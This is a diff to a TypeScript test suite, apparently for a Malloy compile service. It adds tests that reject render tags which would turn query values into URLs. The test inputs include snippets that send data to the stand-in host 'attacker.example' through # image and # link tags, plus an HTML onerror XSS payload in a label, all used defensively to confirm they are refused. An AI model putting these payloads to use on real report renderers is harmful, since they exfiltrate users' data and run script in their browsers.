@@ -36,6 +36,11 @@ const BASE_MODEL = `source: base_source is duckdb.sql("select 1 as id, 5 as n") 
   measure: c is count()
 }`;
 
+const IMAGES_MODEL = `source: pics is duckdb.sql("select 'https://example.test/a.png' as pic") extend {
+  dimension: # image
+    pic_url is pic
+}`;
+
 const TRACKS_MODEL = `import "base.malloy"
 source: tracks is base_source extend {
   measure: total is n.sum()
@@ -77,6 +82,10 @@ describe("compile construct containment", () => {
             '{"name":"pkg"}',
          );
          await fs.writeFile(path.join(stagingPath, "base.malloy"), BASE_MODEL);
+         await fs.writeFile(
+            path.join(stagingPath, "images.malloy"),
+            IMAGES_MODEL,
+         );
          await fs.writeFile(
             path.join(stagingPath, "tracks.malloy"),
             TRACKS_MODEL,
@@ -390,6 +399,78 @@ source: published is duckdb.sql("select 1 as id") extend {
                "append",
             ),
          ).rejects.toThrow(CompileRefusedError);
+      });
+   });
+
+   // -- render tags that turn a value into a URL -------------------------------
+
+   describe('scope "append" refuses render tags that make a value a URL', () => {
+      const LEAK = "https://attacker.example/p?d=";
+      const forms: Record<string, string> = {
+         "# image on a dimension": `source: leaky is base_source extend {\n  dimension: # image\n    pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
+         "# image inline before the field name": `source: leaky is base_source extend { dimension: # image pic is concat('${LEAK}', 'x') }\nrun: leaky -> { group_by: pic }`,
+         "# image on a query's output field": `run: base_source -> { group_by: # image pic is concat('${LEAK}', 'x') }`,
+         "# link with a url_template": `run: base_source -> { group_by: # link { url_template="${LEAK}$$" } name is 'x' }`,
+         "# link on a view": `source: leaky is base_source extend {\n  # link\n  view: v is { group_by: id }\n}\nrun: leaky -> v`,
+         "# image under another tag": `run: base_source -> { group_by: # column { image } pic is 'x' }`,
+         "an image tag with options": `run: base_source -> { group_by: # image { height=40px } pic is 'x' }`,
+         "HTML in a # label": `run: base_source -> { group_by: # label="<img src=x onerror=alert(1)>" id }`,
+      };
+
+      for (const [name, source] of Object.entries(forms)) {
+         it(`refuses ${name}, before anything compiles`, async () => {
+            const error = await refusalFor(source, "append");
+            expect(error).toBeInstanceOf(CompileRefusedError);
+            expect(error.message).toContain('scope "append"');
+         });
+      }
+
+      it("answers a field that exists and one that does not with the same shape", async () => {
+         const answer = async (field: string) =>
+            (
+               await refusalFor(
+                  `run: base_source -> { group_by: # image pic is concat('${LEAK}', ${field}) }`,
+                  "append",
+               )
+            ).message;
+         expect(await answer("id")).toBe(await answer("no_such_column"));
+      });
+
+      it("is not fooled by an apostrophe in a prose block ahead of the tag", async () => {
+         await refusalFor(
+            `##|(markdown) intro\ndon't stop\n|##\nrun: base_source -> { group_by: # image pic is 'x' }`,
+            "append",
+         );
+      });
+
+      it("leaves a caller field with unrelated tags alone", async () => {
+         const errors = await errorsFor(
+            `source: s is base_source extend {\n  # label="Rows"\n  measure: rows is count()\n  # bar_chart\n  view: v is { aggregate: rows }\n}\nrun: s -> v`,
+            "append",
+         );
+         expect(errors).toEqual([]);
+      });
+
+      it("does not read a tag name inside a string or a comment as a tag", async () => {
+         const errors = await errorsFor(
+            `// # image\nrun: base_source -> { group_by: # label="an image link"\n x is 'image'\n}`,
+            "append",
+         );
+         expect(errors).toEqual([]);
+      });
+
+      it("keeps a model-defined # image working", async () => {
+         const { problems } = await compile(
+            `run: pics -> { group_by: pic_url }`,
+            "append",
+            "images.malloy",
+         );
+         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
+      });
+
+      it("does not refuse the model file's own tags at scope file", async () => {
+         const { problems } = await compile(IMAGES_MODEL, "file");
+         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
       });
    });
 
